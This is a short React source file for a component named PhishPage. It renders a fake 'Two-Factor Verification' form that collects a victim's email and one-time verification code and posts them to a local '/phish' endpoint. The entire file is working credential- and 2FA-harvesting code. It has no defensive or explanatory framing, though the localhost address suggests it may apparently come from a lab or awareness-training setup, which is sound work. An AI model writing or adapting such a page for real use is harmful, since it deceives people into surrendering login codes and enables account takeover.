import React, { useState } from "react";

export default function PhishPage() {
  const [email, setEmail] = useState("");
  const [passcode, setPasscode] = useState("");

  return (
    <div className="container mt-5">
      <h2>Two-Factor Verification</h2>
      <form method="POST" action="http://localhost:8080/phish">
        <input name="email" className="form-control" value={email} onChange={e => setEmail(e.target.value)} placeholder="Email" />
        <input name="passcode" className="form-control mt-2" value={passcode} onChange={e => setPasscode(e.target.value)} placeholder="Verification code" />
        <button className="btn btn-danger mt-3" type="submit">Verify</button>
      </form>
    </div>
  );
}
